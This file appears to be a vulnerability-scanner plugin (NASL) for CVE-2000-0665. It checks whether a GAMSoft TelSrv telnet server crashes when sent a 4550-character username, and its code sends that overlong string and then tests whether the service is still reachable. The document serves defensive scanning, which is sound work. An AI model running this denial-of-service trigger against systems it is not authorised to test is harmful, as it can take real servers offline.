# SPDX-FileCopyrightText: 2000 Prizm
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10474");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/1478");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2000-0665");
  script_name("GAMSoft TelSrv 1.4/1.5 Overflow");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2000 Prizm");
  script_family("Denial of Service");
  script_dependencies("telnetserver_detect_type_nd_version.nasl");
  script_require_ports("Services/telnet", 23);
  script_mandatory_keys("telnet/banner/available");

  script_tag(name:"solution", value:"Contact your vendor for a patch.");

  script_tag(name:"summary", value:"It is possible to crash the remote telnet server by
  sending a username that is 4550 characters long.");

  script_tag(name:"impact", value:"An attacker may use this flaw to prevent you
  from administering this host remotely.");

  script_tag(name:"solution_type", value:"Mitigation");

  exit(0);
}

include("telnet_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = telnet_get_port(default:23);

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

r = telnet_negotiate(socket:soc);
r2 = recv(socket:soc, length:4096);
r = r + r2;
if(!r) {
  close(soc);
  exit(0);
}


r = recv(socket:soc, length:8192);
if("5 second delay" >< r)
  sleep(5);

r = recv(socket:soc, length:8192);
req = string(crap(4550), "\r\n");
send(socket:soc, data:req);
close(soc);
sleep(1);

soc2 = open_sock_tcp(port);
if(!soc2)
  security_message(port:port);
else {
  r = telnet_negotiate(socket:soc2);
  r2 = recv(socket:soc2, length:4096);
  r = r + r2;
  close(soc2);
  if(!r) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
